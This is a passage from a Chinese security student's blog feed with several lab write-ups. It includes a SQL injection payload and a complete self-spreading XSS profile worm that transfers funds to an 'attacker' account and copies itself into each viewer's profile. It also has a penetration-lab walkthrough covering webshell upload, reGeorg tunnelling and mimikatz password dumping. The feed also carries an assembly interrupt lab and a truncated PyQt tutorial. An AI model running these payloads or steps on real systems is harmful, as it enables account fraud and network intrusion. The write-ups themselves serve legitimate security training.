class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user3&#39; or username GLOB &#39;user3?*</span><br></pre></td></tr></table></figure><p>拼接出来的SQL语句必然是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from users where username &#x3D; user3 or username GLOB &#39;user3?*&#39;</span><br></pre></td></tr></table></figure><p>登陆</p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1589676748910.png" alt></p><p>删除</p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1589676771789.png" alt></p><p>此时可以看到后台执行的SQL语句</p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1589676794562.png" alt></p><h2 id="Attack-6-Profile-Worm"><a href="#Attack-6-Profile-Worm" class="headerlink" title="Attack 6: Profile Worm"></a>Attack 6: Profile Worm</h2><p>问题出在渲染用户的profile上面</p><p><code>profile.html.erb</code> 中，渲染用户的 <code>profile</code> 代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> @<span class="attr">user.profile</span> <span class="attr">and</span> @<span class="attr">user.profile</span> != <span class="string">""</span> %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"profile"</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">sanitize_profile</span>(@<span class="attr">user.profile</span>) %&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">end</span> %&gt;</span></span><br></pre></td></tr></table></figure><p>调用了函数 <code>sanitize_profile</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sanitize_profile</span><span class="params">(profile)</span></span></span><br><span class="line">  <span class="keyword">return</span> sanitize(profile, <span class="symbol">tags:</span> <span class="string">%w(a br b h1 h2 h3 h4 i img li ol p strong table tr td th u ul em span)</span>, <span class="symbol">attributes:</span> <span class="string">%w(id class href colspan rowspan src align valign)</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>其中 <code>santitize</code> 函数，通过 <code>tags</code> 和 <code>attributes</code> 可以指定允许的标签和属性白名单。</p><p>然而属性中出现了 <code>href</code>,这意味着我们可以使用JavaScript伪协议来XSS</p><p>参考： <a href="https://ruby-china.org/topics/28760" target="_blank" rel="noopener">https://ruby-china.org/topics/28760</a></p><p>比如</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">strong</span> <span class="attr">id</span>=<span class="string">"bitbar_count"</span> <span class="attr">class</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br></pre></td></tr></table></figure><p>更新自己的 <code>profile</code> 时，查看自己的profile，即可弹窗</p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1589677835296.png" alt></p><p>如果有用户浏览当前的profile，那么将会发生两个操作</p><ol><li>转账操作</li><li>更新用户的profile</li></ol><p>转账操作的代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">"POST"</span>, <span class="string">"http://localhost:3000/post_transfer"</span>);</span><br><span class="line">request.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">request.withCredentials = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    request.send(<span class="string">"quantity=1&amp;destination_username=attacker"</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">//xxxx 带执行的操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>转帐完成之后，我们需要立即更新当前浏览用户的 <code>profile</code></p><p>设置 <code>profile</code> 的数据包如下</p><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/1589678078348.png" alt></p><p>只需要向路由 <code>/set_profile</code> 发送请求即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">"POST"</span>, <span class="string">"http://localhost:3000/set_profile"</span>, <span class="literal">true</span>);</span><br><span class="line">request.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">request.withCredentials = <span class="literal">true</span>;</span><br><span class="line">request.send(<span class="string">"new_profile="</span>.concat(<span class="built_in">escape</span>(<span class="built_in">document</span>.getElementById(<span class="string">'hax-wrap'</span>).outerHTML)));</span><br></pre></td></tr></table></figure><p>遇到的问题：</p><ol><li>发送的数据含有html转移后的 &amp; 符号。如图</li></ol><p><img src= "/img/loading.gif" data-src="/posts/bc703cb4/clipboard.png" alt></p><p>这里我采用的是 <code>String.fromCharCode()</code> 来将其做一次转换</p><ol start="2"><li>字符串拼接只能用 <code>concat</code> 而不能用 <code>+</code> ，因为  <code>+</code> 号在 html 中是空格的意思</li></ol><p>最后的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"wrap"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"bitbar_count"</span> <span class="attr">class</span>=<span class="string">"eval(document['getElementById']('pxy')['innerHTML'])"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"pxy"</span>&gt;</span></span><br><span class="line">document.getElementById('pxy').style.display = "none";</span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line"></span><br><span class="line">    var request = new XMLHttpRequest();</span><br><span class="line">    request.open("POST", "http://localhost:3000/post_transfer");</span><br><span class="line">    request.setRequestHeader("Content-type","application/x-www-form-urlencoded");</span><br><span class="line">    request.withCredentials = true;</span><br><span class="line">    try &#123;</span><br><span class="line">        request.send("quantity=1".concat(String.fromCharCode(38)).concat("destination_username=attacker"));</span><br><span class="line">    &#125; catch (err) &#123;</span><br><span class="line">    //</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        request = new XMLHttpRequest();</span><br><span class="line">        request.open("POST", "http://localhost:3000/set_profile", true);</span><br><span class="line">        request.setRequestHeader("Content-type","application/x-www-form-urlencoded");</span><br><span class="line">        request.withCredentials = true;</span><br><span class="line">        request.send("new_profile=".concat(escape(document.getElementById('wrap').outerHTML)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;, 0);</span><br><span class="line">10;</span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>233333<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ps: 也可以用 js 动态创建 form表单的方式，但是这样页面是会跳转的，无法满足</p><blockquote><p>在转账和profile的赋值过程中，浏览器的地址栏需要始终停留在<a href="http://localhost:3000/profile?username=x" target="_blank" rel="noopener">http://localhost:3000/profile?username=x</a> ，其中x是profile被浏览的用户名。</p></blockquote><p>附上js动态创建form表单的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;span id=<span class="string">"wrap"</span>&gt;</span><br><span class="line">&lt;strong id=<span class="string">"bitbar_count"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"eval((document['getElementById']('pxy').innerHTML))"</span>&gt;&lt;<span class="regexp">/strong&gt;</span></span><br><span class="line"><span class="regexp">&lt;span id="pxy"&gt;</span></span><br><span class="line"><span class="regexp">document.getElementById('pxy').style.display = "none";</span></span><br><span class="line"><span class="regexp">function makeForm()&#123;</span></span><br><span class="line"><span class="regexp">    var form = document.createElement("form");</span></span><br><span class="line"><span class="regexp">    form.id = "pay";</span></span><br><span class="line"><span class="regexp">    </span></span><br><span class="line"><span class="regexp">    document.body.appendChild(form);</span></span><br><span class="line"><span class="regexp">    var input = document.createElement("input");</span></span><br><span class="line"><span class="regexp">    input.type = "text";</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    input.name =  "destination_username";</span></span><br><span class="line"><span class="regexp">    input.value = "attacker";</span></span><br><span class="line"><span class="regexp">    input.type = 'hidden';</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    form.appendChild(input);</span></span><br><span class="line"><span class="regexp">    var input2 = document.createElement("input");</span></span><br><span class="line"><span class="regexp">    input2.type = "hidden";</span></span><br><span class="line"><span class="regexp">    input2.name = "quantity";</span></span><br><span class="line"><span class="regexp">    input2.value = 10</span></span><br><span class="line"><span class="regexp">    </span></span><br><span class="line"><span class="regexp">    form.appendChild(input2);</span></span><br><span class="line"><span class="regexp">    form.action = "http:/</span><span class="regexp">/localhost:3000/</span>post_transfer<span class="string">";</span></span><br><span class="line"><span class="string">    form.method = "</span>POST<span class="string">";</span></span><br><span class="line"><span class="string">    form.enctype = "</span>application/x-www-form-urlencode<span class="string">";</span></span><br><span class="line"><span class="string">    form.submit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">makeForm();</span></span><br><span class="line"><span class="string">request = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">request.open("</span>POST<span class="string">", "</span>http:<span class="comment">//localhost:3000/set_profile", true);</span></span><br><span class="line">request.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">request.withCredentials = <span class="literal">true</span>;</span><br><span class="line">request.send(<span class="string">"new_profile="</span>.concat(<span class="built_in">escape</span>(<span class="built_in">document</span>.getElementById(<span class="string">'wrap'</span>).outerHTML)));</span><br><span class="line">&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>span&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Attack-1-Warm-up-exercise-Cookie-Theft&quot;&gt;&lt;a href=&quot;#Attack-1-Warm-up-exercise-Cookie-Theft&quot; class=&quot;headerlink&quot; title=&quot;Attack  1: Warm-
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://prontosil.me/categories/CTF/"/>
    
    
      <category term="实验" scheme="https://prontosil.me/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土八</title>
    <link href="https://prontosil.me/posts/90d750b6/"/>
    <id>https://prontosil.me/posts/90d750b6/</id>
    <published>2020-04-29T03:03:16.000Z</published>
    <updated>2020-04-29T03:38:14.510Z</updated>
    
    <content type="html"><![CDATA[<h2 id="中断处理的流程-牢记"><a href="#中断处理的流程-牢记" class="headerlink" title="中断处理的流程(牢记)"></a>中断处理的流程(牢记)</h2><p><img src= "/img/loading.gif" data-src="/posts/90d750b6/clipboard.png" alt></p><p>关于第三步</p><p>为什么要设置第8位 TF？</p><p>这就涉及到debug程序的原理：</p><blockquote><p>debug的原理，通过设置 TF 为1，引发单步中断去执行debug准备好的中断代码</p><p><img src= "/img/loading.gif" data-src="/posts/90d750b6/1588129690345.png" alt></p></blockquote><p>但是这样会有问题，在处理中断的时候是不能去触发单步中断的，所以CPU要提前设置TF为0</p><p>中断过程具体的操作</p><p><img src= "/img/loading.gif" data-src="/posts/90d750b6/1588129813844.png" alt></p><h2 id="lab12"><a href="#lab12" class="headerlink" title="lab12"></a>lab12</h2><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,offset do0</span><br><span class="line">    </span><br><span class="line">    mov ax,0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,200H</span><br><span class="line">    </span><br><span class="line">    mov cx,offset do0end-offset do0</span><br><span class="line">    </span><br><span class="line">    rep movsb</span><br><span class="line">    </span><br><span class="line">    mov ax,0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov word ptr es:[0],200H</span><br><span class="line">    mov word ptr es:[2],0</span><br><span class="line"></span><br><span class="line">    mov ax, 1000h</span><br><span class="line">    mov bh, 1</span><br><span class="line">    div bh</span><br><span class="line">    mov ax,4C00H</span><br><span class="line">    int 21H</span><br><span class="line"></span><br><span class="line">do0:</span><br><span class="line">    jmp short do0start</span><br><span class="line">    db &quot;divide error!&quot;</span><br><span class="line">do0start:</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,202H</span><br><span class="line">    mov ax,0B800H</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,12*160+33*2;这里要注意一下，不能因为字符串长度为13，为了居中输出就设置成12*160+67，会出现意想不到的情况</span><br><span class="line">    mov cx,13</span><br><span class="line">    s:</span><br><span class="line">    mov al,[si]</span><br><span class="line">    mov es:[di],al</span><br><span class="line">    inc si</span><br><span class="line">    add di,2</span><br><span class="line">    loop s</span><br><span class="line">    mov ax,4C00H</span><br><span class="line">    int 21H</span><br><span class="line">do0end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>通过 <code>offset</code> 获得偏移地址</p><p>通过 <code>rep movsb</code> 来拷贝 do0 程序</p><blockquote><p>这里特别注意，do0 要使用的字符串必须存储在 do0 子程序中，并且需要手动计算一下字符串的位置</p></blockquote><p>当然最后还需要来触发这个中断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax, 1000h</span><br><span class="line">mov bh, 1</span><br><span class="line">div bh</span><br></pre></td></tr></table></figure><p>如果直接存放原来data中的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">db &quot;overflow!&quot;</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:</span><br><span class="line">    mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,offset do0</span><br><span class="line">    </span><br><span class="line">    mov ax,0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,200H</span><br><span class="line">    </span><br><span class="line">    mov cx,offset do0end-offset do0</span><br><span class="line">    </span><br><span class="line">    rep movsb</span><br><span class="line">    </span><br><span class="line">    mov ax,0</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov word ptr es:[0],200H</span><br><span class="line">    mov word ptr es:[2],0</span><br><span class="line"></span><br><span class="line">    mov ax, 1000h</span><br><span class="line">    mov bh, 1</span><br><span class="line">    div bh</span><br><span class="line">    mov ax,4C00H</span><br><span class="line">    int 21H</span><br><span class="line"></span><br><span class="line">do0:</span><br><span class="line">    mov ax,data</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov si,0</span><br><span class="line">    mov ax,0B800H</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov di,12*160+33*2</span><br><span class="line">    mov cx,13</span><br><span class="line">    s:</span><br><span class="line">    mov al,[si]</span><br><span class="line">    mov es:[di],al</span><br><span class="line">    inc si</span><br><span class="line">    add di,2</span><br><span class="line">    loop s</span><br><span class="line">    mov ax,4C00H</span><br><span class="line">    int 21H</span><br><span class="line">do0end:nop</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>也是可以执行的</p><p><img src= "/img/loading.gif" data-src="/posts/90d750b6/1588131368497.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;中断处理的流程-牢记&quot;&gt;&lt;a href=&quot;#中断处理的流程-牢记&quot; class=&quot;headerlink&quot; title=&quot;中断处理的流程(牢记)&quot;&gt;&lt;/a&gt;中断处理的流程(牢记)&lt;/h2&gt;&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-sr
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="https://prontosil.me/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>企业环境渗透一</title>
    <link href="https://prontosil.me/posts/c7cfd527/"/>
    <id>https://prontosil.me/posts/c7cfd527/</id>
    <published>2020-04-29T01:06:42.000Z</published>
    <updated>2020-06-11T08:46:33.264Z</updated>
    
    <content type="html"><![CDATA[<h2 id="任务一-后台文件上传"><a href="#任务一-后台文件上传" class="headerlink" title="任务一 后台文件上传"></a>任务一 后台文件上传</h2><p>本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要完成以下内容：</p><p>1.1 使用目录扫描工具对目标网站的后台地址进行扫描(如wwwscan)</p><p>1.2 使用Burpsuite工具爆破后台管理员密码</p><p>1.3 使用爆破出的管理员密码登录后台，并上传一句话木马</p><p>1.4 使用中国菜刀连接一句话木马</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588072738413.png" alt></p><p>得到后台登陆地址为 <code>manager/login.php</code></p><p>同时发现扫描出了 <code>/myadmin</code> ，猜测是 <code>phpmyadmin</code></p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073088324.png" alt></p><p>弱口令 root ， root试一下，成功登陆</p><p>在数据库中发现了用户名和密码</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073175463.png" alt></p><p>md5解密：</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073186989.png" alt></p><p>成功登陆后台，得到 falg1</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073231030.png" alt></p><h2 id="任务二-sql注入"><a href="#任务二-sql注入" class="headerlink" title="任务二 sql注入"></a>任务二 sql注入</h2><ol><li>利用之前扫描目录得到的结果访问到测试的sql，利用SQL注入漏洞获得网站数据库信息</li><li>构造SQL注入语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell</li></ol><p>访问存在SQL注入漏洞的页面，表的字段为10</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073668068.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588073693517.png" alt></p><p>尝试联合注入失败</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074070981.png" alt></p><p>可以直接登陆后台，并修改配置：</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074131115.png" alt></p><p>然后就可以从后台上传php文件了</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074182455.png" alt></p><p>成功上传</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074223735.png" alt></p><p>使用菜刀进行连接</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074257325.png" alt></p><p>flag</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074320768.png" alt></p><h2 id="任务三-phpmyadmin-写shell"><a href="#任务三-phpmyadmin-写shell" class="headerlink" title="任务三 phpmyadmin 写shell"></a>任务三 phpmyadmin 写shell</h2><ol><li>用之前扫描目录的结果访问phpmyadmin页面，利用弱口令登录到 <code>phpmyadmin</code> 服务中</li><li>构造SQL语句读取webserver配置文件查看网站根目录，写入php一句话木马，获得webshell</li></ol><p>弱口令登录 phpmyadmin，访问到flag表得到flag</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588074309330.png" alt></p><h2 id="任务四-扫描PC端并登陆"><a href="#任务四-扫描PC端并登陆" class="headerlink" title="任务四 扫描PC端并登陆"></a>任务四 扫描PC端并登陆</h2><ol><li>利用已经获取到权限的web机器，上传扫描脚本对内网中的其他主机进行扫描</li><li>利用web代理工具代理访问内网的主机，使用之前数据库中获得的账号密码进行登录</li></ol><p>上传 <code>RAScan.py</code>，扫描</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121789196.png" alt></p><p>扫描结果</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121802724.png" alt></p><p>可以看到 192.168.2.11 和 192.168.2.10 都开放了3389端口</p><p>上传 <code>tunnel.nosocket.php</code>，访问：</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121885782.png" alt></p><p>然后使用 <code>reGeorgSocksProxy.py</code> 开启代理</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121921831.png" alt></p><p>打开 <code>Proxifier</code>，新建连接</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121958945.png" alt></p><p>然后设置规则：</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121982402.png" alt></p><p>远程登陆 192.168.2.11</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588122014576.png" alt></p><p>回过头来看数据库，密码是 <code>topsec.123</code></p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588121697982.png" alt></p><p>成功连接</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588122024967.png" alt></p><p>flag在C盘根目录</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588122036042.png" alt></p><h2 id="任务五-抓取域控密码并登陆域控"><a href="#任务五-抓取域控密码并登陆域控" class="headerlink" title="任务五 抓取域控密码并登陆域控"></a>任务五 抓取域控密码并登陆域控</h2><ol><li>利用已经登陆到远程桌面的机器，上传mimikatz工具抓取机器内存中的密码</li><li>利用抓取到的密码登陆到另一台机器2.10中</li></ol><p>上传 <code>mimikatz</code> 到 192.168.2.11 的桌面</p><p>以管理员身份运行，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>得到密码</p><p><img src= "/img/loading.gif" data-src="/posts/c7cfd527/1588122108804.png" alt></p><p>远程登陆 192.168.2.10</p><p>flag在C盘根目录</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;任务一-后台文件上传&quot;&gt;&lt;a href=&quot;#任务一-后台文件上传&quot; class=&quot;headerlink&quot; title=&quot;任务一 后台文件上传&quot;&gt;&lt;/a&gt;任务一 后台文件上传&lt;/h2&gt;&lt;p&gt;本实验任务基于真实企业网络环境，在三台服务器搭建的典型企业局域网环境中，主要
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://prontosil.me/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="实验" scheme="https://prontosil.me/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>端口转发</title>
    <link href="https://prontosil.me/posts/c0e91c93/"/>
    <id>https://prontosil.me/posts/c0e91c93/</id>
    <published>2020-04-25T05:37:12.000Z</published>
    <updated>2020-04-25T09:22:34.739Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>pyqt入门</title>
    <link href="https://prontosil.me/posts/341a7d9a/"/>
    <id>https://prontosil.me/posts/341a7d9a/</id>
    <published>2020-04-24T01:54:45.000Z</published>
    <updated>2020-04-27T08:22:59.309Z</updated>
    
    <content type="html"><![CDATA[<p>编写一个简单地GUI应用如下</p><p><img src= "/img/loading.gif" data-src="/posts/341a7d9a/1587693985383.png" alt></p><p>拖动进度条，下面两个框框会显示不同的数据</p><p>输入姓名，点击设置姓名，下面的框框回回显数据</p><p>点击关闭按钮关闭窗口</p><h2 id="GUI设计"><a href="#GUI设计" class="headerlink" title="GUI设计"></a>GUI设计</h2><p>妥妥拽拽即可</p><p><img src= "/img/loading.gif" data-src="/posts/341a7d9a/1587694105991.png" alt></p><p>两个 <code>groupbox</code> 布局可以通过</p><p><img src= "/img/loading.gif" data-src="/posts/341a7d9a/1587694167654.png" alt></p><p>进行设置</p><h2 id="信号和槽"><a href="#信号和槽" class="headerlink" title="信号和槽"></a>信号和槽</h2><p>关闭按钮的信号直接通过拖动即可关联</p><h3 id="自定义信号"><a href="#自定义信号" class="headerlink" title="自定义信号"></a>自定义信号</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> QObject,pyqtSlot,pyqtSignal</span><br><span class="line"></span><br><span class="line"><span class="class"><span 